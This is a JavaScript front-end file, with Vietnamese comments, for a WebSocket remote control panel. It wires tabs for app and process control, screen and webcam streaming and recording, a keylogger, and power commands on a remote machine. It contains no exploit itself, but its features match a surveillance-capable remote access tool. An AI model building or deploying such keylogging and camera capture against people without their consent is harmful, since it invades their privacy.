// app.js (File Main - Phien ban WebSocket)
import { store } from "./modules/store.js";
import { onCommand, sendCommand } from "./modules/socket.js";
import {
  logActionUI,
  toggleActionLog,
  showTab as uiShowTab,
  filterTable,
  handleTabHover,
  handleTabLeave,
} from "./modules/ui.js";

// Import cac ham tuong tac
import * as appTab from "./modules/tab-apps.js";
import * as procTab from "./modules/tab-procs.js";
import * as screenTab from "./modules/tab-screen.js";
import * as camTab from "./modules/tab-cam.js";
import * as keylogTab from "./modules/tab-keylog.js";
import * as sysTab from "./modules/tab-sys.js";

// --- MOI: Tao ham 'showTab' moi (wrapper) ---
const showTab = (id) => {
  // 1. Lay trang thai stream TRUOC KHI lam bat cu dieu gi
  const wasScreenStreaming = store.isScreenStreamOn;
  const wasCamStreaming = store.isCamStreamOn;

  // 2. Luon luon chuyen giao dien (UI)
  uiShowTab(id);

  // 3. Kiem tra xem co can reset UI khong
  // Neu dang stream VA chuyen sang tab KHAC (khong phai tab screen/cam)
  if (
    (wasScreenStreaming || wasCamStreaming) &&
    id !== "screen" &&
    id !== "cam"
  ) {
    logActionUI("Chuyển tab đã ngắt luồng stream.", true);

    // Goi ham 'toggle' o che do "reset" (truyen 'null')
    // De dua UI ve trang thai ban dau (tat nut, xoa anh)
    if (wasScreenStreaming) {
      window.toggleScreenStream(null);
    }
    if (wasCamStreaming) {
      window.toggleCamStream(null);
    }
  }

  // 4. Tai du lieu cho tab moi (Day la luc stream C++ bi ngat that)
  if (store.socketReady) {
    if (id === "apps") {
      appTab.loadApps();
      appTab.renderRecents();
    }
    if (id === "procs") {
      procTab.loadProcs();
    }
    if (id === "keylog") {
      keylogTab.loadKeylog();
    }
  }
};

// --- GAN HAM VAO WINDOW DE HTML GOI DUOC ---
window.logActionUI = logActionUI;
window.toggleActionLog = toggleActionLog;
window.showTab = showTab;
window.filterTable = filterTable;
window.handleTabHover = handleTabHover;
window.handleTabLeave = handleTabLeave;

window.loadApps = appTab.loadApps;
window.closeWin = appTab.closeWin;
window.startCmd = appTab.startCmd;
window.renderRecents = appTab.renderRecents;

window.loadProcs = procTab.loadProcs;
window.kill = procTab.kill;

window.updateScreen = screenTab.updateScreen;
window.toggleAutoShot = screenTab.toggleAutoShot;
window.loadGallery = screenTab.loadGallery;
window.clearGallery = screenTab.clearGallery;
window.toggleScreenStream = screenTab.toggleScreenStream;

window.loadDevices = camTab.loadDevices;
window.recordVideo = camTab.recordVideo;
window.loadVidGallery = camTab.loadVidGallery;
window.clearVideos = camTab.clearVideos;
window.toggleCamStream = camTab.toggleCamStream;

window.toggleKeylog = keylogTab.toggleKeylog;
window.clearLogs = keylogTab.clearLogs;
window.loadKeylog = keylogTab.loadKeylog;

window.sendPower = sysTab.sendPower;

// --- DANG KY CAC HAM XU LY PHAN HOI ---
onCommand("GET_APPS", appTab.handleAppsData);
onCommand("GET_PROCS", procTab.handleProcsData);
onCommand("GET_DEVICES", camTab.handleDevicesData);
onCommand("GET_KEYLOG", keylogTab.handleKeylogData);
onCommand("RECORD_VIDEO", camTab.handleRecordVideoData);
onCommand("GET_SCREENSHOT", screenTab.handleScreenshotData);

// --- LANG NGHE SU KIEN TU SOCKET ---
window.addEventListener("socket:open", () => {
  logActionUI("Đã kết nối tới Gateway!", true);
  store.socketReady = true; // MOI: Danh dau socket san sang

  // GUI LENH TAI THIET BI (CHI 1 LAN)
  sendCommand("GET_DEVICES");

  // Hien thi tab dau tien (se tu dong tai apps)
  showTab("apps");
});
window.addEventListener("socket:close", (event) => {
  logActionUI(`Mất kết nối: ${event.detail}`, false);
  store.socketReady = false;
});
window.addEventListener("socket:error", (event) => {
  const msg =
    event.detail === "WebSocket not ready"
      ? "Lỗi: WebSocket chưa sẵn sàng!"
      : event.detail;
  logActionUI(msg, false);
});

// --- KHOI TAO INDEXEDDB ---
const DB_REQ = indexedDB.open("RemoteDB_V2", 2);
DB_REQ.onupgradeneeded = (e) => {
  let db = e.target.result;
  if (!db.objectStoreNames.contains("images"))
    db.createObjectStore("images", { keyPath: "id", autoIncrement: true });
  if (!db.objectStoreNames.contains("videos"))
    db.createObjectStore("videos", { keyPath: "id", autoIncrement: true });
};
DB_REQ.onsuccess = (e) => {
  store.db = e.target.result;
  screenTab.loadGallery();
  camTab.loadVidGallery();
};

// --- KHOI CHAY UNG DUNG ---
const logArea = document.getElementById("logArea");
if (logArea) {
  logArea.value = sessionStorage.getItem("keylogs") || "";
}
